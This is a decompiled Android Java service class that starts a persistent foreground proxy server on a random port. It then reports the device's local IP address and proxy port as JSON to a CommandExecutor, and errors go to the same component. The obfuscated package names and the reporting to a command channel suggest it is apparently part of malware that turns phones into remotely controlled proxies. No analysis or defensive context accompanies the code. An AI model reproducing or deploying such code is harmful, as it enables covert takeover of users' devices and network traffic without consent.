/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.Notification
 *  android.app.Service
 *  android.content.Context
 *  android.content.Intent
 *  android.os.Build$VERSION
 *  android.os.IBinder
 *  android.util.Log
 *  org.json.JSONObject
 */
package linker.resourcer.encoder;

import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import linker.resourcer.encoder.MyProxy;
import linker.resourcer.encoder.CommandExecutor;
import linker.resourcer.encoder.UtilityHelper;
import linker.resourcer.encoder.ProxyServerService$$ExternalSyntheticLambda0;
import linker.resourcer.encoder.AndroidLogger;
import linker.resourcer.encoder.NotificationBuilder;
import org.json.JSONObject;

/*
 * Illegal identifiers - consider using --renameillegalidents true
 */
public class ProxyServerService
extends Service {
    private static int Notifi_ID = 111;
    private ExecutorService executorService;
    private MyProxy proxyServer;

    private void startforground(Context context) {
        try {
            context = NotificationBuilder.getInstance(context).createNotification(context);
            if (Build.VERSION.SDK_INT >= 34) {
                this.startForeground(Notifi_ID, (Notification)context, 0x40000000);
            } else {
                this.startForeground(Notifi_ID, (Notification)context);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    /* synthetic */ void lambda$onStartCommand$0$com-icontrol-protector-ProxyServerService(Context context) {
        try {
            int n;
            while (UtilityHelper.isPortInUse(n = UtilityHelper.randomnumber(2000, 9000))) {
            }
            Object object = new MyProxy(n);
            this.proxyServer = object;
            object = new StringBuilder();
            AndroidLogger.Debug("ProxyServerService", ((StringBuilder)object).append("Proxy server started on port ").append(n).toString());
            object = UtilityHelper.getdeviceIpAddress();
            StringBuilder stringBuilder = new StringBuilder();
            AndroidLogger.Debug("ProxyServerService", stringBuilder.append("localip ").append((String)object).toString());
            stringBuilder = new JSONObject();
            stringBuilder.put("ctype", "first");
            stringBuilder.put("loip", object);
            stringBuilder.put("pport", n);
            CommandExecutor.instance(context).ProxyMsg(context, (JSONObject)stringBuilder);
            this.proxyServer.start(context);
        }
        catch (Exception exception) {
            AndroidLogger.Error("ProxyServerService", "Error starting proxy server" + exception.getMessage());
            exception.printStackTrace();
            try {
                JSONObject jSONObject = new JSONObject();
                jSONObject.put("ctype", (Object)"state");
                StringBuilder stringBuilder = new StringBuilder();
                jSONObject.put("smsg", (Object)stringBuilder.append("Error: ").append(exception.getMessage()).toString());
                CommandExecutor.instance(context).ProxyMsg(context, jSONObject);
            }
            catch (Exception exception2) {
                exception2.printStackTrace();
            }
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onDestroy() {
        super.onDestroy();
        Log.d((String)"ProxyServerService", (String)"onDestroy  proxy server");
        if (this.proxyServer != null) {
            this.proxyServer.stop();
        }
        if (this.executorService != null) {
            this.executorService.shutdown();
        }
    }

    public int onStartCommand(Intent intent, int n, int n2) {
        intent = this.getApplicationContext();
        this.executorService = Executors.newSingleThreadExecutor();
        this.executorService.execute(new ProxyServerService$$ExternalSyntheticLambda0(this, (Context)intent));
        this.startforground(this.getApplicationContext());
        return 1;
    }
}

